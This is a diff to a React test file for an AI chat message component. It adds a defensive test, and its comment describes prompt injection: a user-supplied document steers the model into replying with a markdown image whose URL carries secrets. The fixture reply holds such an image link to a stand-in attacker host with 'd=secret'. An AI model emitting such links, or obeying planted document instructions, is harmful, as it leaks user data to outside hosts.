@@ -71,6 +71,24 @@ describe("AIChatMessage", () => {
     expect(screen.queryByRole("button", { name: "Read Aloud" })).not.toBeInTheDocument();
   });
 
+  // A reply is shaped by the document the user sent, so a note can steer the
+  // model into an image URL carrying the note's contents; an <img> would
+  // fetch it the moment the reply renders.
+  it("shows a reply image as text instead of loading it", () => {
+    const { container } = render(
+      <AIChatMessage
+        turn={{
+          id: 1,
+          role: "assistant",
+          content: "Done ![summary](https://attacker.example/c?d=secret)",
+        }}
+      />,
+    );
+    expect(container.querySelector("img")).toBeNull();
+    const placeholder = screen.getByText("summary");
+    expect(placeholder).toHaveAttribute("title", "https://attacker.example/c?d=secret");
+  });
+
   it("omits the read-aloud button entirely when TTS is unavailable", () => {
     render(<AIChatMessage turn={{ id: 1, role: "assistant", content: "reply" }} />);
     expect(screen.queryByRole("button", { name: "Read Aloud" })).not.toBeInTheDocument();
